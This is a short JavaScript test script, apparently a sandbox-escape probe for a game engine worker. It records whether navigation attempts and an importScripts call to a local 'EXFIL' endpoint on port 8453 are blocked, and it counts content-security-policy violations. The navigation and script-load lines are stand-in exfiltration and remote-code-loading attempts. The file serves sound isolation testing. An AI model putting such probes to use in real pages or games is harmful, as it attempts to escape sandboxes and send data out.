// @title m10 navigation attempts (kept for continuity; worker has no navigation)
// @engine 0.2
// @capabilities hud
const R = {}, V = []; try { addEventListener("securitypolicyviolation", e => V.push(e.violatedDirective.split("-")[0])); } catch (e) {}
const T = (k, f) => { try { const r = f(); R[k] = (r && r.then) ? "async" : "OPEN:" + String(r).slice(0, 20); if (r && r.then) r.then(v => R[k] = "OPEN(async):" + JSON.stringify(v).slice(0, 40), e => R[k] = "blocked:" + (e && e.name || e)); } catch (e) { R[k] = "blocked:" + (e && e.name) + (e && e.name === "Error" ? ":" + String(e.message).slice(0, 80) : ""); } };
const done = (api, ms) => setTimeout(() => { R.csp = V.length; api.end({ score: 0, text: JSON.stringify(R) }); }, ms || 1200);
const X = "http://localhost:8453/EXFIL/", S = "http://127.0.0.1:8453/EXFIL/"; // X = أصل مختلف، S = أصل المضيف نفسه
defineGame({ init(api) {
  T("location.href_set", () => { const h = self.location.href; self.location.href = "http://localhost:8453/EXFIL/refresh"; if (self.location.href !== h) throw new Error("FOUND:changed"); return "inert"; }); T("location.hash", () => { const h = self.location.href; self.location.hash = "x"; if (self.location.href !== h) throw new Error("FOUND:changed"); return "inert"; });
  T("importScripts_exfil", () => importScripts("http://localhost:8453/EXFIL/js"));
  done(api, 800);
}, update() {}, render() {} });
